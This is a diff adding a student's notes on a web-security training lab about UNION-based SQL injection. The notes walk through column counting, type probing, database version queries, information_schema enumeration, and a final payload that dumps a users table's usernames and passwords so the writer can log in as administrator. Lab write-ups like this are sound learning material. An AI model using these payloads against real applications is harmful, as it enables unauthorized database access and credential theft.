@@ -1,0 +1,48 @@
+Lab 9 - Sql injection attack, listing the database contents on non-Oracle databases
+
+End goals:
+    1. Determine the table that contains usernames and passwords
+    2. Output the content of the table
+    3. Login as the administrator user
+
+Analysis:
+    1. Find the number of columns 
+    'order by 3-- Internal server error
+    3 - 1 = 2
+
+    2. Find the datatype of the columns
+    'UNION SELECT 'a', NULL--
+    => Both columns accept type text
+
+    3. Figure out version of the database
+    use SQLi cheatsheeet
+
+    Oracle: SELECT banner FROM v$version or SELECT version FROM v$instance > ' UNION SELECT banner, NULL FROM v$version--
+
+    Microsoft: SELECT @@version > ' UNION SELECT @@version, NULL--
+
+    PostgreSQL: SELECT version() > ' UNION SELECT version(), NULL--
+
+    MySQL: SELECT @@version > ' UNION SELECT version(), NULL--
+
+    => database version Determined
+
+    4. Output the list of table name in the database
+
+    WE can list the tables that exist in the database, and the columns that those tables contain.
+
+    Oracle: SELECT * FROM all_tables
+    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+    Microsoft, PostgreSQL, MySQL: SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+    ' UNION SELECT table_name, NULL FROM information_schema.tables--
+    => user_xdww
+
+    5. Output the column names of the table
+    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'user_xdww'--
+    => username_jdja, password_djda
+
+    6. Output the usernames and passwords
+    ' UNION SELECT username_jdja, password_djda FROM user_xdww--
